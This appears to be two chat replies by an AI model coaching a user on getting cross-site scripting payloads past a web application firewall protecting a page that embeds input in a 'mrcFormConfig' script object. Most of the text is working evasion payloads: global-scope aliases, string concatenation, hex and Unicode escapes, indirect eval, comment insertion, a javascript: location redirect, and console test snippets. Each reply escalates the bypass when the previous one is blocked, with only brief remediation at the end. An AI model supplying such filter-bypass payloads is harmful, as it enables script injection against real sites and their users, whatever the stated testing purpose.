If the Web Application Firewall (WAF) blocks the keyword window, you can bypass the signature check by utilizing JavaScript global scope references [1]. In a browser environment, window is the global object, meaning it can be accessed implicitly or via alternative global pointers [1].
Here are the standard techniques used in security testing to reference the global scope and execute your obfuscated alert functions without using the word window.
## 1. Implicit Global Execution (Omitting window)
In JavaScript, properties of the global object (like alert) can be called directly without specifying window. [1]. If the browser can parse the statement, it will automatically look for the function in the global scope.

* Direct Function Call:
```
"}; alert(1); //
```
* Using the Function Constructor:
This creates a new function dynamically and executes it globally, avoiding both window and direct string matching.
```
"}; Function('ale'+'rt(1)')(); //
```

## 2. Alternative Global Object References
If the context requires an object reference (for example, to use bracket notation like ['al'+'ert']), you can use alternative keywords that point to the exact same global object as window.

* Using this:
In a global context or an unbinded function, this points directly to the global window object [1].
```
"}; this['al'+'ert'](1); //
```
* Using top or parent:
If the page is not framed, top and parent refer directly to the topmost window context [1].
```
"}; top['al'+'ert'](1); //
"}; parent['al'+'ert'](1); //
```
* Using self:
The self property returns the window object itself, commonly used in both standard scripts and web workers.
```
"}; self['al'+'ert'](1); //
```
* Using globalThis:
Introduced in modern JavaScript, globalThis provides a standard way to access the global scope across any environment.
```
"}; globalThis['al'+'ert'](1); //
```

## 3. Combining with the Logical OR Vector
Applying these global object alternatives to your secondary logical syntax payload looks like this:

* Using this:
```
" || this['al\x65rt'](1) || "
```
* Using self:
```
" || self['\x61\x6c\x65\x72\x74'](1) || "
```

## 4. Console Verification Code
To verify how these alternative scope identifiers function inside the target JSON structure, paste this snippet into your browser console:
```
// Test 1: Simulating 'this' scoping inside an assignment context
window.mrcFormConfig = {"type": "wizard"}; this['al'+'ert']('This Scope Success'); //"};
// Test 2: Simulating 'self' inside a logical expression
window.mrcFormConfig = {"type": "wizard"} || self['al\x65rt']('Self Scope Success') || {"type": "wizard"};
```
## Remediation
Blacklisting words like window or alert is a weak defense because JavaScript offers numerous aliases for the global context.
To properly fix this, the application must treat the data as strict JSON data rather than raw text inside the script tag. Implement HTML entity encoding or Unicode escaping on the server side before outputting variables into JavaScript blocks.
If you are writing a filter to fix this vulnerability, tell me how your server-side validation is currently structured (e.g., regex blacklist, HTML sanitizer) so we can look at implementing proper output encoding.

If the Web Application Firewall (WAF) is blocking bracket notation strings like this[, top[, self[, and globalThis[, it is trying to stop you from dynamically looking up strings via objects.
To bypass this without using brackets [ or the blocked keywords, you can leverage JavaScript's native string execution paths and alternative whitespace or separator characters that browsers parse natively but WAF regexes often miss.
Here are the standard techniques used in authorized security testing to bypass global object bracket restrictions.
## 1. The Indirect eval Call (No Brackets)
Instead of looking up alert inside an object, you can invoke the global eval function indirectly. When eval is called indirectly, it automatically executes within the global scope. You can pass it a concatenated string using parentheses () instead of brackets [.

* Standard Concatenation:
```
"}; (0,eval)('al'+'ert(1)'); //
```
* Using String Templates (No Quotes):
If quotes are also a problem, backticks can be used to construct strings.
```
"}; (0,eval)(`al`+`ert(1)`); //
```

## 2. Space / Comment Insertion (Breaking Signature Matching)
WAF rules often look for strict patterns like this[. You can frequently blind the firewall signature by placing JavaScript comments or specific whitespace characters between the keyword and the bracket. The browser's parser strips these out, but a rigid WAF signature will fail to match.

* Multi-line Comment Insertion:
```
"}; this/**/[/*test*/'al'+'ert'/**/](1); //
```
* Newline and Whitespace Insertion:
```
"}; this
['al'+'ert'
](1); //
```

## 3. Hex / Unicode Scoping (Encoding the Keyword)
If the WAF looks for the literal string this, you cannot type it directly. However, JavaScript allows you to use Unicode escape sequences inside variable and property names natively.

* Unicode Escaped this:
The Unicode sequence for t is \u0074 and h is \u0068.
```
"}; \u0074\u0068is['al'+'ert'](1); //
```
* Unicode Escaped self:
The Unicode sequence for s is \u0073.
```
"}; \u0073elf['al'+'ert'](1); //
```

## 4. The URL/Location Vector (No Reference to Global Elements)
If you cannot touch any global scope keywords or brackets, you can force the browser to redirect its execution flow into a javascript: pseudo-protocol using the location object.

* Location Assignment:
```
"}; location='jav'+'ascript:al'+'ert(1)'; //
```

## 5. Console Testing Cheatsheet
To verify how the browser parses these advanced variations within your specific assignment context, you can run these directly in your browser's Developer Tools Console:

// Test 1: Indirect eval check
window.mrcFormConfig = {"type": "wizard"}; (0,eval)('al'+'ert("Indirect Eval Success")'); //"};
// Test 2: Comment obfuscation check
window.mrcFormConfig = {"type": "wizard"}; this/**/[/**/'al'+'ert'/**/]("Comment Success"); //"};
// Test 3: Unicode keyword lookup check
window.mrcFormConfig = {"type": "wizard"}; \u0074\u0068is['al'+'ert']("Unicode Success"); //"};

## Remediation
This scenario demonstrates why blacklist-based firewalls fail: attackers can continuously rotate between encoding styles, comment blocks, and scope behaviors.
To mitigate this comprehensively, you must enforce Context-Aware Server-Side Output Encoding:

* Ensure the application sanitizes data with a strict JSON serializer that escapes characters like " to \".
* If the user input is meant to be a strict string, validate it using a strict alphanumeric whitelist regex on the server side before it ever hits the HTML rendering engine.

Could you tell me what programming language or framework is powering the backend of this application? We can look at the precise built-in sanitization functions available for it.

